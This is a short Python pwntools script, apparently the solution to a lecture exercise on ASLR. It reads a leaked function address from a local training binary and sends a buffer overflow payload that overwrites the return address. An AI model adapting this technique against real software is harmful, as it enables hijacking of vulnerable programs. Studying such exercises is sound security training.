# lecture:lecture

from pwn import *

def main():

  p = process(['/levels/lecture/aslr/aslr_leak1'])

  leak = p.recvline().split(" ")[-1].strip()
  log.info("i_am_rly_leet at: %s" % leak)
  p.sendline(exploit_buffer(leak))

  try:
    while True:
      line = p.recvline()
      if line:
        log.success(line.rstrip('\n'))
  except:
    pass

def exploit_buffer(retAddr):

  offset   = "A" * 28
  ret_addr = struct.pack('<L', int(retAddr, 16))
  rest     = "C" * (100 - (28+4))

  return ( "%s%s%s" % ( offset, ret_addr, rest ) )

main()
